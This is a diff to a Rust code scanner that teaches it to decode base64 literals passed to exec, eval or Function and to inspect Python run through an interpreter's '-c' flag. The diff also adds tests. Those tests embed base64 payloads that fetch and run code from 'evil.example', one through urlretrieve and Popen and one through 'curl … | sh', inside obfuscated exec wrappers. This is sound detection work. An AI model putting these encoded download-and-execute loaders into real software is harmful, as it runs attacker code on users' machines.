@@ -597,45 +597,90 @@ fn nested_code(toks: &[Token<'_>], lang: Lang, fa: &mut FileAnalysis, depth: u32
     if depth >= MAX_LITERAL_CODE_DEPTH {
         return Vec::new();
     }
-    let mut lits = literal_code(toks, lang);
-    // Bundlers wrap each module of a development build in `eval("...")` and name it with a
-    // `//# sourceURL=` comment; reading those as code would put whole libraries in view.
-    lits.retain(|&k| {
-        !toks[k].text.contains("sourceURL=") && !toks[k].text.contains("sourceMappingURL=")
-    });
-    for &k in &lits {
+    let mut skip = Vec::new();
+    for (k, enc) in literal_code(toks, lang) {
         let t = toks[k];
+        // Bundlers wrap each module of a development build in `eval("...")` and name it
+        // with a `//# sourceURL=` comment; reading those as code would put whole libraries
+        // in view.
+        if t.text.contains("sourceURL=") || t.text.contains("sourceMappingURL=") {
+            continue;
+        }
+        let code = match enc {
+            Encoding::Plain => {
+                skip.push(k);
+                unescape_code(t.text)
+            }
+            // The encoded blob stays a string too: its length and entropy are evidence.
+            Encoding::Base64 => match decode_base64_text(t.text) {
+                Some(text) => std::borrow::Cow::Owned(text),
+                None => continue,
+            },
+        };
         let mut inner = FileAnalysis::default();
-        analyze_source(&unescape_code(t.text), lang, &mut inner, depth + 1);
+        analyze_source(&code, lang, &mut inner, depth + 1);
         // A literal written over several lines keeps its lines; one written on a single
-        // line (with `\n` escapes) puts every hit on that line.
-        fa.merge_nested(inner, t.line, t.text.contains('\n'));
+        // line (with `\n` escapes) or encoded puts every hit on that line.
+        let spans_lines = enc == Encoding::Plain && t.text.contains('\n');
+        fa.merge_nested(inner, t.line, spans_lines);
     }
-    lits
+    skip
 }
 
-/// String literals that are run as code: the first argument of Python `exec(...)`,
-/// `eval(...)` and `compile(...)`, and of JavaScript `eval(...)`, or the body (last
-/// argument) of `Function(...)` / `new Function(...)`. Indices into `toks`, in order.
-pub(crate) fn literal_code(toks: &[Token<'_>], lang: Lang) -> Vec<usize> {
+/// How a literal that is run as code is written.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Encoding {
+    Plain,
+    Base64,
+}
+
+/// Names of base64 decoders in Python and JavaScript.
+const B64_DECODERS: &[&str] = &[
+    "b64decode",
+    "standard_b64decode",
+    "urlsafe_b64decode",
+    "decodebytes",
+    "decodestring",
+    "a2b_base64",
+    "atob",
+];
+
+/// String literals that are run as code, with their encoding:
+/// - the first argument of Python `exec(...)`, `eval(...)` and `compile(...)`, of JavaScript
+///   `eval(...)`, and the body (last argument) of `Function(...)` / `new Function(...)`;
+/// - the same calls over one base64 literal decoded in place (`exec(b64decode('...'))`,
+///   `eval(atob('...'))`, `eval(Buffer.from('...', 'base64').toString())`);
+/// - Python code passed on a command line: the literal after `'-c'` in a list that also
+///   names `sys.executable` or a `python` program (`Popen([sys.executable, '-c', '...'])`).
+///
+/// Indices into `toks`, in order.
+pub(crate) fn literal_code(toks: &[Token<'_>], lang: Lang) -> Vec<(usize, Encoding)> {
     let mut out = Vec::new();
+    let is_str = |k: usize| toks.get(k).is_some_and(|t| t.kind == TokKind::Str);
+    let is = |k: usize, x: &str| {
+        toks.get(k)
+            .is_some_and(|t| t.kind != TokKind::Str && t.text == x)
+    };
     for (i, t) in toks.iter().enumerate() {
-        if t.kind != TokKind::Ident || toks.get(i + 1).is_none_or(|n| n.text != "(") {
+        if lang == Lang::Python && t.kind == TokKind::Str && t.text == "-c" {
+            if is(i + 1, ",") && is_str(i + 2) && interpreter_list(toks, i) {
+                out.push((i + 2, Encoding::Plain));
+            }
+            continue;
+        }
+        if t.kind != TokKind::Ident || !is(i + 1, "(") {
             continue;
         }
         if i > 0 && toks[i - 1].text == "." && toks[i - 1].kind == TokKind::Punct {
             continue;
         }
-        let is_str = |k: usize| toks.get(k).is_some_and(|t| t.kind == TokKind::Str);
-        let is = |k: usize, x: &str| {
-            toks.get(k)
-                .is_some_and(|t| t.kind != TokKind::Str && t.text == x)
-        };
         match (lang, t.text) {
             (Lang::Python, "exec" | "eval" | "compile") | (Lang::Js, "eval") => {
                 // The code is the first argument; the rest are scopes, a file name or a mode.
                 if is_str(i + 2) && (is(i + 3, ")") || is(i + 3, ",")) {
-                    out.push(i + 2);
+                    out.push((i + 2, Encoding::Plain));
+                } else if let Some(k) = base64_argument(toks, i + 1) {
+                    out.push((k, Encoding::Base64));
                 }
             }
             (Lang::Js, "Function") => {
@@ -645,13 +690,104 @@ pub(crate) fn literal_code(toks: &[Token<'_>], lang: Lang) -> Vec<usize> {
                     k += 2;
                 }
                 if is_str(k) && is(k + 1, ")") {
-                    out.push(k);
+                    out.push((k, Encoding::Plain));
+                } else if let Some(k) = base64_argument(toks, i + 1) {
+                    out.push((k, Encoding::Base64));
                 }
             }
             _ => {}
         }
     }
+    // `exec(compile(b64decode('...'), ...))` finds the literal from both calls.
+    out.sort_unstable_by_key(|&(k, _)| k);
+    out.dedup_by_key(|&mut (k, _)| k);
     out
+}
+
+/// The one string literal inside the parenthesized argument list that opens at `open`,
+/// when that list also decodes base64 (a decoder name, or `'base64'` as an encoding).
+fn base64_argument(toks: &[Token<'_>], open: usize) -> Option<usize> {
+    let mut depth = 0usize;
+    let mut lit = None;
+    let mut decodes = false;
+    for (k, t) in toks.iter().enumerate().skip(open) {
+        match (t.kind, t.text) {
+            (TokKind::Punct, "(" | "[" | "{") => depth += 1,
+            (TokKind::Punct, ")" | "]" | "}") => {
+                depth = depth.checked_sub(1)?;
+                if depth == 0 {
+                    return (decodes).then_some(lit?);
+                }
+            }
+            (TokKind::Ident, name) if B64_DECODERS.contains(&name) => decodes = true,
+            (TokKind::Str, "base64" | "base64url") => decodes = true,
+            (TokKind::Str, text) if text.len() >= 16 => {
+                if lit.is_some() {
+                    return None;
+                }
+                lit = Some(k);
+            }
+            _ => {}
+        }
+        if k - open > 64 {
+            return None;
+        }
+    }
+    None
+}
+
+/// Whether the bracketed list holding the `'-c'` at `c` also names a Python interpreter.
+fn interpreter_list(toks: &[Token<'_>], c: usize) -> bool {
+    toks[c.saturating_sub(8)..c]
+        .iter()
+        .rev()
+        .take_while(|t| !(t.kind == TokKind::Punct && matches!(t.text, "[" | "(")))
+        .any(|t| match t.kind {
+            TokKind::Ident => t.text == "executable",
+            TokKind::Str => {
+                let base = t.text.rsplit(['/', '\\']).next().unwrap_or("");
+                base.starts_with("python")
+            }
+            _ => false,
+        })
+}
+
+/// Decode a base64 literal (standard or URL-safe alphabet, whitespace and `\n` escapes
+/// ignored) to text; `None` unless it decodes cleanly to mostly printable UTF-8.
+pub(crate) fn decode_base64_text(s: &str) -> Option<String> {
+    let mut bits = 0u32;
+    let mut nbits = 0u32;
+    let mut out = Vec::with_capacity(s.len() / 4 * 3);
+    let mut chars = s.bytes().peekable();
+    while let Some(c) = chars.next() {
+        let v = match c {
+            b'A'..=b'Z' => c - b'A',
+            b'a'..=b'z' => c - b'a' + 26,
+            b'0'..=b'9' => c - b'0' + 52,
+            b'+' | b'-' => 62,
+            b'/' | b'_' => 63,
+            b'=' => break,
+            b' ' | b'\t' | b'\r' | b'\n' => continue,
+            b'\\' if chars.peek() == Some(&b'n') => {
+                chars.next();
+                continue;
+            }
+            _ => return None,
+        };
+        bits = (bits << 6) | u32::from(v);
+        nbits += 6;
+        if nbits >= 8 {
+            nbits -= 8;
+            out.push((bits >> nbits) as u8);
+            bits &= (1 << nbits) - 1;
+        }
+    }
+    let text = String::from_utf8(out).ok()?;
+    let printable = text
+        .chars()
+        .filter(|c| !c.is_control() || c.is_whitespace())
+        .count();
+    (text.len() >= 8 && printable * 10 >= text.chars().count() * 9).then_some(text)
 }
 
 fn analyze_shell(text: &str, fa: &mut FileAnalysis) {
@@ -1458,6 +1594,59 @@ mod tests {
         assert_eq!(js(bundled)[PROC_EXEC], 0);
         let c = py("cursor.exec('import socket\\nsocket.socket()')\n");
         assert_eq!((c[NETWORK], c[DYN_CODE]), (0, 0));
+    }
+
+    #[test]
+    fn encoded_and_command_line_code_is_read() {
+        let py_b64 = "aW1wb3J0IHN1YnByb2Nlc3MsdXJsbGliLnJlcXVlc3QgYXMgdQp1LnVybHJldHJpZXZlKCJodHRwczovL2V2aWwuZXhhbXBsZS9iIiwgIi90bXAvYiIpCnN1YnByb2Nlc3MuUG9wZW4oWyIvdG1wL2IiXSkK";
+        // exec over a base64 literal decoded in place: the decoded code is read.
+        for wrapped in [
+            format!("import base64\nexec(base64.b64decode('{py_b64}'))\n"),
+            format!("import base64\nexec(base64.b64decode('{py_b64}').decode())\n"),
+            format!("from base64 import b64decode as d\nexec(compile(b64decode(\"{py_b64}\"), '<s>', 'exec'))\n"),
+        ] {
+            let c = py(&wrapped);
+            assert!(c[NETWORK] >= 1 && c[PROC_EXEC] >= 1 && c[URL] == 1, "{wrapped}");
+        }
+        // The same literal without a decoder around it is just data.
+        let c = py(&format!("exec('{py_b64}')\n"));
+        assert_eq!((c[NETWORK], c[URL]), (0, 0));
+        // JavaScript atob and Buffer.from(.., 'base64').
+        let js_b64 = "cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2N1cmwgaHR0cHM6Ly9ldmlsLmV4YW1wbGUveCB8IHNoJyk=";
+        for wrapped in [
+            format!("eval(atob('{js_b64}'))\n"),
+            format!("eval(Buffer.from('{js_b64}', 'base64').toString())\n"),
+            format!("new Function(Buffer.from(\"{js_b64}\", \"base64\").toString('utf8'))()\n"),
+        ] {
+            let c = js(&wrapped);
+            assert!(c[PROC_EXEC] >= 1 && c[URL] == 1, "{wrapped}");
+        }
+        // Python run through an interpreter's -c flag (the litellm 1.82.8 .pth shape).
+        let c = py("import subprocess, sys\n\
+                    subprocess.Popen([sys.executable, '-c', 'import socket\\nsocket.socket()'])\n");
+        assert!(c[NETWORK] >= 1);
+        let c =
+            py("import subprocess\nsubprocess.run(['/usr/bin/python3', '-c', 'import socket'])\n");
+        assert!(c[NETWORK] >= 1);
+        // `-c` for another program is not Python.
+        let c = py("import subprocess\nsubprocess.run(['sh', '-c', 'import socket'])\n");
+        assert_eq!(c[NETWORK], 0);
+    }
+
+    #[test]
+    fn base64_text_decoding() {
+        assert_eq!(
+            decode_base64_text("aW1wb3J0IG9zCg==").as_deref(),
+            Some("import os\n")
+        );
+        assert_eq!(
+            decode_base64_text("aW1wb3J0\\nIG9zCg").as_deref(),
+            Some("import os\n")
+        );
+        // Not base64, too short, or binary once decoded.
+        assert_eq!(decode_base64_text("not base64 at all!"), None);
+        assert_eq!(decode_base64_text("aGk="), None);
+        assert_eq!(decode_base64_text("AAECAwQFBgcICQoLDA0ODw=="), None);
     }
 
     #[test]
